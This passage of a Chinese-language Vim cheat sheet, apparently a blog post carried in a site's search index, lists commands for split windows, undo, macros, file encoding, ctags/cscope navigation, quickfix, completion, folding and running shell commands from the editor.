把所有的缓冲区在当前页中打开，每个缓冲区占一个窗口。</span><br></pre></td></tr></table></figure><h2 id="分屏编辑"><a href="#分屏编辑" class="headerlink" title="分屏编辑"></a>分屏编辑</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -o file1 file2:水平分割窗口，同时打开file1和file2</span><br><span class="line">vim -O file1 file2:垂直分割窗口，同时打开file1和file2</span><br></pre></td></tr></table></figure><h3 id="水平分割"><a href="#水平分割" class="headerlink" title="水平分割"></a>水平分割</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">:split(:sp) -- 把当前窗水平分割成两个窗口。(CTRL-W s 或 CTRL-W CTRL-S)</span><br><span class="line">    注意如果在终端下，CTRL-S可能会冻结终端，请按CTRL-Q继续。</span><br><span class="line">:split filename -- 水平分割窗口，并在新窗口中显示另一个文件。</span><br><span class="line">:nsplit(:nsp) -- 水平分割出一个n行高的窗口。</span><br><span class="line">:[N]new -- 水平分割出一个N行高的窗口，并编辑一个新文件。 (CTRL-W n或 CTRL-W CTRL-N)</span><br><span class="line">ctrl+w f --水平分割出一个窗口，并在新窗口打开名称为光标所在词的文件 。</span><br><span class="line">C-w C-^ -- 水平分割一个窗口，打开刚才编辑的文件。</span><br></pre></td></tr></table></figure><h3 id="垂直分割"><a href="#垂直分割" class="headerlink" title="垂直分割"></a>垂直分割</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:vsplit(:vsp) -- 把当前窗口分割成水平分布的两个窗口。 (CTRL-W v或CTRL CTRL-V)</span><br><span class="line">:[N]vne[w] -- 垂直分割出一个新窗口。</span><br><span class="line">:vertical 水平分割的命令： 相应的垂直分割。</span><br></pre></td></tr></table></figure><h3 id="关闭子窗口"><a href="#关闭子窗口" class="headerlink" title="关闭子窗口"></a>关闭子窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:qall -- 关闭所有窗口，退出vim。</span><br><span class="line">:wall -- 保存所有修改过的窗口。</span><br><span class="line">:only -- 只保留当前窗口，关闭其它窗口。(CTRL-W o)</span><br><span class="line">:close -- 关闭当前窗口，CTRL-W c能实现同样的功能。 (象 :q :x同样工作 )</span><br></pre></td></tr></table></figure><h3 id="调整窗口大小"><a href="#调整窗口大小" class="headerlink" title="调整窗口大小"></a>调整窗口大小</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ctrl+w + --当前窗口增高一行。也可以用n增高n行。</span><br><span class="line">ctrl+w - --当前窗口减小一行。也可以用n减小n行。</span><br><span class="line">ctrl+w _ --当前窗口扩展到尽可能的大。也可以用n设定行数。</span><br><span class="line">:resize n -- 当前窗口n行高。</span><br><span class="line">ctrl+w = -- 所有窗口同样高度。</span><br><span class="line">n ctrl+w _ -- 当前窗口的高度设定为n行。</span><br><span class="line">ctrl+w &lt; --当前窗口减少一列。也可以用n减少n列。</span><br><span class="line">ctrl+w &gt; --当前窗口增宽一列。也可以用n增宽n列。</span><br><span class="line">ctrl+w | --当前窗口尽可能的宽。也可以用n设定列数。</span><br></pre></td></tr></table></figure><h3 id="切换和移动窗口"><a href="#切换和移动窗口" class="headerlink" title="切换和移动窗口"></a>切换和移动窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果支持鼠标，切换和调整子窗口的大小就简单了。</span><br><span class="line"></span><br><span class="line">ctrl+w ctrl+w: 切换到下一个窗口。或者是ctrl+w w。</span><br><span class="line">ctrl+w p: 切换到前一个窗口。</span><br><span class="line">ctrl+w h(l,j,k):切换到左（右，下，上）的窗口。</span><br><span class="line">ctrl+w t(b):切换到最上（下）面的窗口。&lt;BR&gt;</span><br><span class="line">ctrl+w H(L,K,J): 将当前窗口移动到最左（右、上、下）面。</span><br><span class="line">ctrl+w r：旋转窗口的位置。</span><br><span class="line">ctrl+w T: 将当前的窗口移动到新的标签页上。</span><br></pre></td></tr></table></figure><h2 id="快速编辑"><a href="#快速编辑" class="headerlink" title="快速编辑"></a>快速编辑</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~: 反转光标所在字符的大小写。</span><br><span class="line">可视模式下的U或u：把选中的文本变为大写或小写。</span><br><span class="line">gu(U)接范围（如$，或G），可以把从光标当前位置到指定位置之间字母全部</span><br><span class="line">    转换成小写或大写。如ggguG，就是把开头到最后一行之间的字母全部变为小</span><br><span class="line">    写。再如gu5j，把当前行和下面四行全部变成小写。</span><br></pre></td></tr></table></figure><h3 id="替换（normal模式）"><a href="#替换（normal模式）" class="headerlink" title="替换（normal模式）"></a>替换（normal模式）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r: 替换光标处的字符，同样支持汉字。</span><br><span class="line">R: 进入替换模式，按esc回到正常模式。</span><br></pre></td></tr></table></figure><h3 id="撤消与重做（normal模式）"><a href="#撤消与重做（normal模式）" class="headerlink" title="撤消与重做（normal模式）"></a>撤消与重做（normal模式）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[n] u: 取消一(n)个改动。</span><br><span class="line">:undo 5 -- 撤销5个改变。</span><br><span class="line">:undolist -- 你的撤销历史。</span><br><span class="line">ctrl + r: 重做最后的改动。</span><br><span class="line">U: 取消当前行中所有的改动。</span><br><span class="line">:earlier 4m -- 回到4分钟前</span><br><span class="line">:later 55s -- 前进55秒</span><br></pre></td></tr></table></figure><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. --重复上一个编辑动作</span><br><span class="line">qa：开始录制宏a（键盘操作记录）</span><br><span class="line">q：停止录制</span><br><span class="line">@a：播放宏a</span><br></pre></td></tr></table></figure><h2 id="编辑特殊文件"><a href="#编辑特殊文件" class="headerlink" title="编辑特殊文件"></a>编辑特殊文件</h2><h3 id="文件加解密"><a href="#文件加解密" class="headerlink" title="文件加解密"></a>文件加解密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim -x file: 开始编辑一个加密的文件。</span><br><span class="line">:X -- 为当前文件设置密码。</span><br><span class="line">:set key= -- 去除文件的密码。</span><br><span class="line"></span><br><span class="line">这里是 滇狐总结的比较高级的vi技巧。</span><br></pre></td></tr></table></figure><h3 id="文件的编码"><a href="#文件的编码" class="headerlink" title="文件的编码"></a>文件的编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:e ++enc=utf8 filename, 让vim用utf-8的编码打开这个文件。</span><br><span class="line">:w ++enc=gbk，不管当前文件什么编码，把它转存成gbk编码。</span><br><span class="line">:set fenc或:set fileencoding，查看当前文件的编码。</span><br><span class="line">在vimrc中添加set fileencoding=ucs-bom,utf-8,cp936，</span><br><span class="line">    vim会根据要打开的文件选择合适的编码。 注意：编码之间不要留空格。</span><br><span class="line">    cp936对应于gbk编码。 ucs-bom对应于windows下的文件格式。</span><br><span class="line"></span><br><span class="line">让vim 正确处理文件格式和文件编码，有赖于 ~/.vimrc的正确配置</span><br></pre></td></tr></table></figure><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">大致有三种文件格式：unix, dos, mac. 三种格式的区别主要在于回车键的编码：</span><br><span class="line">    dos 下是回车加换行，unix 下只有 换行符，mac 下只有回车符。</span><br><span class="line"></span><br><span class="line">:e ++ff=dos filename, 让vim用dos格式打开这个文件。</span><br><span class="line">:w ++ff=mac filename, 以mac格式存储这个文件。</span><br><span class="line">:set ff，显示当前文件的格式。</span><br><span class="line">在vimrc中添加set fileformats=unix,dos,mac，让vim自动识别文件格式。</span><br></pre></td></tr></table></figure><h2 id="编程辅助"><a href="#编程辅助" class="headerlink" title="编程辅助"></a>编程辅助</h2><h3 id="一些按键"><a href="#一些按键" class="headerlink" title="一些按键"></a>一些按键</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gd: 跳转到局部变量的定义处；</span><br><span class="line">gD: 跳转到全局变量的定义处，从当前文件开头开始搜索；</span><br><span class="line">g;: 上一个修改过的地方；</span><br><span class="line">g,: 下一个修改过的地方；</span><br><span class="line">[[: 跳转到上一个函数块开始，需要有单独一行的&#123;。</span><br><span class="line">]]: 跳转到下一个函数块开始，需要有单独一行的&#123;。</span><br><span class="line">[]: 跳转到上一个函数块结束，需要有单独一行的&#125;。</span><br><span class="line">][: 跳转到下一个函数块结束，需要有单独一行的&#125;。</span><br><span class="line">[&#123;: 跳转到当前块开始处；</span><br><span class="line">]&#125;: 跳转到当前块结束处；</span><br><span class="line">[/: 跳转到当前注释块开始处；</span><br><span class="line">]/: 跳转到当前注释块结束处；</span><br><span class="line">%: 不仅能移动到匹配的(),&#123;&#125;或[]上，而且能在#if，#else， #endif之间跳跃。</span><br><span class="line"></span><br><span class="line">下面的括号匹配对编程很实用的。</span><br><span class="line"></span><br><span class="line">ci&apos;, di&apos;, yi&apos;：修改、剪切或复制&apos;之间的内容。</span><br><span class="line">ca&apos;, da&apos;, ya&apos;：修改、剪切或复制&apos;之间的内容，包含&apos;。</span><br><span class="line">ci&quot;, di&quot;, yi&quot;：修改、剪切或复制&quot;之间的内容。</span><br><span class="line">ca&quot;, da&quot;, ya&quot;：修改、剪切或复制&quot;之间的内容，包含&quot;。</span><br><span class="line">ci(, di(, yi(：修改、剪切或复制()之间的内容。</span><br><span class="line">ca(, da(, ya(：修改、剪切或复制()之间的内容，包含()。</span><br><span class="line">ci[, di[, yi[：修改、剪切或复制[]之间的内容。</span><br><span class="line">ca[, da[, ya[：修改、剪切或复制[]之间的内容，包含[]。</span><br><span class="line">ci&#123;, di&#123;, yi&#123;：修改、剪切或复制&#123;&#125;之间的内容。</span><br><span class="line">ca&#123;, da&#123;, ya&#123;：修改、剪切或复制&#123;&#125;之间的内容，包含&#123;&#125;。</span><br><span class="line">ci&lt;, di&lt;, yi&lt;：修改、剪切或复制&lt;&gt;之间的内容。</span><br><span class="line">ca&lt;, da&lt;, ya&lt;：修改、剪切或复制&lt;&gt;之间的内容，包含&lt;&gt;。</span><br></pre></td></tr></table></figure><h3 id="ctags"><a href="#ctags" class="headerlink" title="ctags"></a>ctags</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ctags -R: 生成tag文件，-R表示也为子目录中的文件生成tags</span><br><span class="line">:set tags=path/tags -- 告诉ctags使用哪个tag文件</span><br><span class="line">:tag xyz -- 跳到xyz的定义处，或者将光标放在xyz上按C-]，返回用C-t</span><br><span class="line">:stag xyz -- 用分割的窗口显示xyz的定义，或者C-w ]， </span><br><span class="line">    如果用C-w n ]，就会打开一个n行高的窗口</span><br><span class="line">:ptag xyz -- 在预览窗口中打开xyz的定义，热键是C-w &#125;。</span><br><span class="line">:pclose -- 关闭预览窗口。热键是C-w z。</span><br><span class="line">:pedit abc.h -- 在预览窗口中编辑abc.h</span><br><span class="line">:psearch abc -- 搜索当前文件和当前文件include的文件，显示包含abc的行。</span><br><span class="line"></span><br><span class="line">有时一个tag可能有多个匹配，如函数重载，一个函数名就会有多个匹配。</span><br><span class="line">    这种情况会先跳转到第一个匹配处。</span><br><span class="line"></span><br><span class="line">:[n]tnext -- 下一[n]个匹配。</span><br><span class="line">:[n]tprev -- 上一[n]个匹配。</span><br><span class="line">:tfirst -- 第一个匹配</span><br><span class="line">:tlast -- 最后一个匹配</span><br><span class="line">:tselect tagname -- 打开选择列表</span><br><span class="line"></span><br><span class="line">tab键补齐</span><br><span class="line"></span><br><span class="line">:tag xyz&lt;tab&gt; -- 补齐以xyz开头的tag名，继续按tab键，会显示其他的。</span><br><span class="line">:tag /xyz&lt;tab&gt; -- 会用名字中含有xyz的tag名补全。</span><br></pre></td></tr></table></figure><h3 id="cscope"><a href="#cscope" class="headerlink" title="cscope"></a>cscope</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cscope -Rbq: 生成cscope.out文件</span><br><span class="line">:cs add /path/to/cscope.out /your/work/dir</span><br><span class="line">:cs find c func -- 查找func在哪些地方被调用</span><br><span class="line">:cw -- 打开quickfix窗口查看结果</span><br></pre></td></tr></table></figure><h3 id="gtags"><a href="#gtags" class="headerlink" title="gtags"></a>gtags</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gtags综合了ctags和cscope的功能。 使用Gtags之前，你需要安装GNU Gtags。</span><br><span class="line">    然后在工程目录运行 gtags 。</span><br><span class="line"></span><br><span class="line">:Gtags funcname 定位到 funcname 的定义处。</span><br><span class="line">:Gtags -r funcname 查询 funcname被引用的地方。</span><br><span class="line">:Gtags -s symbol 定位 symbol 出现的地方。</span><br><span class="line">:Gtags -g string Goto string 出现的地方。 :Gtags -gi string 忽略大小写。</span><br><span class="line">:Gtags -f filename 显示 filename 中的函数列表。 你可以用 :Gtags -f % 显示当前文件。</span><br><span class="line">:Gtags -P pattern 显示路径中包含特定模式的文件。 </span><br><span class="line">    如 :Gtags -P .h$ 显示所有头文件， :Gtags -P /vm/ 显示vm目录下的文件。</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vim提供了:make来编译程序，默认调用的是make， 如果你当前目录下有makefile，简单地:make即可。</span><br><span class="line"></span><br><span class="line">如果你没有make程序，你可以通过配置makeprg选项来更改make调用的程序。</span><br><span class="line">如果你只有一个abc.java文件，你可以这样设置：</span><br><span class="line"></span><br><span class="line">set makeprg=javac\ abc.java</span><br><span class="line"></span><br><span class="line">然后:make即可。如果程序有错，可以通过quickfix窗口查看错误。</span><br><span class="line">不过如果要正确定位错误，需要设置好errorformat，让vim识别错误信息。 如：</span><br><span class="line"></span><br><span class="line">:setl efm=%A%f:%l:\ %m,%-Z%p^,%-C%.%#</span><br><span class="line"></span><br><span class="line">%f表示文件名，%l表示行号， %m表示错误信息，其它的还不能理解。 </span><br><span class="line">请参考 :help errorformat。</span><br></pre></td></tr></table></figure><h3 id="快速修改窗口"><a href="#快速修改窗口" class="headerlink" title="快速修改窗口"></a>快速修改窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">其实是quickfix插件提供的功能， 对编译调试程序非常有用 :)</span><br><span class="line"></span><br><span class="line">:copen -- 打开快速修改窗口。</span><br><span class="line">:cclose -- 关闭快速修改窗口。</span><br><span class="line"></span><br><span class="line">快速修改窗口在make程序时非常有用，当make之后：</span><br><span class="line"></span><br><span class="line">:cl -- 在快速修改窗口中列出错误。</span><br><span class="line">:cn -- 定位到下一个错误。</span><br><span class="line">:cp -- 定位到上一个错误。</span><br><span class="line">:cr -- 定位到第一个错误。</span><br></pre></td></tr></table></figure><h3 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C-x C-s -- 拼写建议。</span><br><span class="line">C-x C-v -- 补全vim选项和命令。</span><br><span class="line">C-x C-l -- 整行补全。</span><br><span class="line">C-x C-f -- 自动补全文件路径。弹出菜单后，按C-f循环选择，当然也可以按 C-n和C-p。</span><br><span class="line">C-x C-p 和C-x C-n -- 用文档中出现过的单词补全当前的词。 直接按C-p和C-n也可以。</span><br><span class="line">C-x C-o -- 编程时可以补全关键字和函数名啊。</span><br><span class="line">C-x C-i -- 根据头文件内关键字补全。</span><br><span class="line">C-x C-d -- 补全宏定义。</span><br><span class="line">C-x C-n -- 按缓冲区中出现过的关键字补全。 直接按C-n或C-p即可。</span><br><span class="line"></span><br><span class="line">当弹出补全菜单后：</span><br><span class="line"></span><br><span class="line">C-p 向前切换成员；</span><br><span class="line">C-n 向后切换成员；</span><br><span class="line">C-e 退出下拉菜单，并退回到原来录入的文字；</span><br><span class="line">C-y 退出下拉菜单，并接受当前选项。</span><br></pre></td></tr></table></figure><h3 id="多行缩进缩出"><a href="#多行缩进缩出" class="headerlink" title="多行缩进缩出"></a>多行缩进缩出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常模式下，按两下&gt;;光标所在行会缩进。</span><br><span class="line">如果先按了n，再按两下&gt;;，光标以下的n行会缩进。</span><br><span class="line">对应的，按两下&lt;;，光标所在行会缩出。</span><br><span class="line">如果在编辑代码文件，可以用=进行调整。</span><br><span class="line">在可视模式下，选择要调整的代码块，按=，代码会按书写规则缩排好。</span><br><span class="line">或者n =，调整n行代码的缩排。</span><br></pre></td></tr></table></figure><h3 id="折叠"><a href="#折叠" class="headerlink" title="折叠"></a>折叠</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zf -- 创建折叠的命令，可以在一个可视区域上使用该命令；</span><br><span class="line">zd -- 删除当前行的折叠；</span><br><span class="line">zD -- 删除当前行的折叠；</span><br><span class="line">zfap -- 折叠光标所在的段；</span><br><span class="line">zo -- 打开折叠的文本；</span><br><span class="line">zc -- 收起折叠；</span><br><span class="line">za -- 打开/关闭当前折叠；</span><br><span class="line">zr -- 打开嵌套的折行；</span><br><span class="line">zm -- 收起嵌套的折行；</span><br><span class="line">zR (zO) -- 打开所有折行；</span><br><span class="line">zM (zC) -- 收起所有折行；</span><br><span class="line">zj -- 跳到下一个折叠处；</span><br><span class="line">zk -- 跳到上一个折叠处；</span><br><span class="line">zi -- enable/disable fold;</span><br></pre></td></tr></table></figure><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">normal模式下按:进入命令行模式</span><br></pre></td></tr></table></figure><h3 id="命令行模式下的快捷键："><a href="#命令行模式下的快捷键：" class="headerlink" title="命令行模式下的快捷键："></a>命令行模式下的快捷键：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">上下方向键：上一条或者下一条命令。如果已经输入了部分命令，则找上一 条或者下一条匹配的命令。</span><br><span class="line">左右方向键：左/右移一个字符。</span><br><span class="line">C-w： 向前删除一个单词。</span><br><span class="line">C-h： 向前删除一个字符，等同于Backspace。</span><br><span class="line">C-u： 从当前位置移动到命令行开头。</span><br><span class="line">C-b： 移动到命令行开头。</span><br><span class="line">C-e： 移动到命令行末尾。</span><br><span class="line">Shift-Left： 左移一个单词。</span><br><span class="line">Shift-Right： 右移一个单词。</span><br><span class="line">@： 重复上一次的冒号命令。</span><br><span class="line">q： 正常模式下，q然后按&apos;:&apos;，打开命令行历史缓冲区， 可以像编辑文件一样编辑命令。</span><br><span class="line">q/和q? 可以打开查找历史记录。</span><br></pre></td></tr></table></figure><h3 id="执行外部命令"><a href="#执行外部命令" class="headerlink" title="执行外部命令"></a>执行外部命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:! cmd 执行外部命令。</span><br><span class="line">:!! 执行上一次的外部命令。</span><br><span class="line">:sh 调用shell，用exit返回vim。</span><br><span class="line">:r !cmd 将命令的返回结果插入文件当前位置。</span><br><span class="line">:m,nw !cmd 将文件的m行到n行之间的内容做为命令输入执行命令。</span><br></pre></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="工作目录"><a href="#工作目录" class="headerlink" title="工作目录"></a>工作目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:pwd 显示vim的工作目录。</span><br><span class="line">:cd path 改变vim的工作目录。</span><br><span class="line">:set autochdir 可以让vim 根据编辑的文件自动切换工作目录。</span><br></pre></td></tr></table></figure><h3 id="一些快捷键（收集中）"><a href="#一些快捷键（收集中）" class="headerlink" title="一些快捷键（收集中）"></a>一些快捷键（收集中）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">K: 打开光标所在词的manpage。</span><br><span class="line">*: 向下搜索光标所在词。</span><br><span class="line">g*: 同上，但部分符合即可。</span><br><span class="line">#: 向上搜索光标所在词。</span><br><span class="line">g#: 同上，但部分符合即可。</span><br><span class="line">g C-g: 统计全文或统计部分的字数。</span><br></pre></td></tr></table></figure><h3 id="在线帮助"><a href="#在线帮助" class="headerlink" title="在线帮助"></a>在线帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:h(elp)或F1 打开总的帮助。</span><br><span class="line">:help user-manual 打开用户手册。</span><br><span class="line">命令帮助的格式为：第一行指明怎么使用那个命令；</span><br><span class="line">    然后是缩进的一段解释这个命令的作用，然后是进一步的信息。</span><br><span class="line">:helptags somepath 为somepath中的文档生成索引。</span><br><span class="line">:helpgrep 可以搜索整个帮助文档，匹配的列表显示在quickfix窗口中。</span><br><span class="line">Ctrl+] 跳转到tag主题，Ctrl+t 跳回。</span><br><span class="line">:ver 显示版本信息。</span><br></pre></td></tr></table></figure><h3 id="一些小功能"><a href="#一些小功能" class="headerlink" title="一些小功能"></a>一些小功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单计算器: 在插入模式下，输入C-r =，然后输入表达式，就能在 光标处得到计算结果。</span><br><span class="line">%s/^\s*//g</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> linux </category>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
